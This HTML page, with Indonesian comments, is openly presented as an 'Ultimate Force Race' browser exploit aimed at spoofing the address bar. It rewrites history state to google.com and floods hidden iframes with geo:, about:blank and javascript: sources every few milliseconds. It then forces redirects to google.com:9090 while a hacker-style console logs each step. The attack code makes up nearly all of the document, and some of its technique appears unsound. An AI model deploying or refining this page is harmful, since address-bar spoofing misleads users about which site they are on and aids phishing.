<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultimate Force Race Engine</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000000;
            color: #00ff66;
            font-family: monospace;
            overflow: hidden;
        }
        #blackout-portal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: #000000;
            z-index: 999999;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .console {
            border: 1px solid #00ff66;
            padding: 24px;
            border-radius: 6px;
            max-width: 500px;
            width: 85%;
            background: #050505;
            box-shadow: 0 0 25px rgba(0, 255, 102, 0.3);
        }
        h3 {
            margin-top: 0;
            color: #ff3366;
            border-bottom: 1px solid #00ff66;
            padding-bottom: 8px;
            font-size: 16px;
        }
        .log-line {
            font-size: 12px;
            margin: 6px 0;
            line-height: 1.4;
        }
        .highlight { color: #38bdf8; }
        .force { color: #facc15; }
    </style>
</head>
<body>

    <div id="blackout-portal">
        <div class="console">
            <h3>[!] Ultimate Force Race Active</h3>
            <div id="status-container">
                <div class="log-line">> Menginisialisasi saturation buffer...</div>
            </div>
        </div>
    </div>

    <script>
        const statusContainer = document.getElementById('status-container');

        function addLog(text, type = '') {
            const div = document.createElement('div');
            div.className = `log-line ${type}`;
            div.innerHTML = `> ${text}`;
            statusContainer.appendChild(div);
        }

        try {
            // 1. Forced History Chaining & State Desynchronization
            history.pushState({force: true, phase: 1}, "", "https://www.google.com");
            history.replaceState({force: true, phase: 2}, "", "https://www.google.com");
            addLog("History state dikunci pada transisi awal: <span class='highlight'>https://www.google.com</span>");

            // 2. High-Frequency Frame Saturation (Race Condition Trigger)
            // Membanjiri antrean render dengan iframe non-HTTP untuk menahan siklus pembaruan bilah alamat
            const saturationVectors = ["geo:0,0?q=force_race", "about:blank", "javascript:void(0)"];
            saturationVectors.forEach((vec, idx) => {
                setTimeout(() => {
                    const f = document.createElement('iframe');
                    f.style.display = 'none';
                    f.src = vec;
                    document.body.appendChild(f);
                    addLog(`Saturation vector [${idx + 1}] dilepaskan.`, "force");
                }, idx * 5); // Interval sangat ketat 5ms
            });

            // 3. Forced Target Pull (Eksekusi Pemaksaan ke google.com:9090)
            // Dijalankan dalam jendela waktu milidetik mikro untuk memotong status loading
            setTimeout(() => {
                addLog("Memaksa tarikan mutlak ke google.com:9090...", "force");
                window.location.replace("https://www.google.com:9090");
            }, 20);

            // 4. Hard Fallback Guarantee
            setTimeout(() => {
                window.location.href = "https://www.google.com:9090";
            }, 60);

        } catch (err) {
            addLog(`Kesalahan Eksekusi: ${err.message}`, "highlight");
            window.location.href = "https://www.google.com:9090";
        }
    </script>
</body>
</html>
